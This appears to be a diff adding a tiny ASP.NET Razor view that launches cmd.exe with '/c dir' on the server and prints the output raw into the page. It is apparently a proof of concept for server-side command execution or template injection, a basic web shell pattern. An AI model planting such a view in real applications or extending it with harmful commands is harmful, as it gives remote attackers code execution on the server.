@@ -1,0 +1,25 @@
+@using System.Diagnostics
+@{
+
+    var proc = new Process
+    {
+        StartInfo = new System.Diagnostics.ProcessStartInfo
+        {
+            FileName = "cmd.exe",
+            Arguments = "/c dir",
+            UseShellExecute = false,
+            RedirectStandardOutput = true,
+            CreateNoWindow = true
+        }
+    };
+
+    proc.Start();
+    string line = "";
+    while (!proc.StandardOutput.EndOfStream)
+    {
+        line = line + proc.StandardOutput.ReadLine() + "<br>";
+    }
+    ViewData["Cmdout"] = line;
+}
+
+@Html.Raw(@ViewData["Cmdout"])%
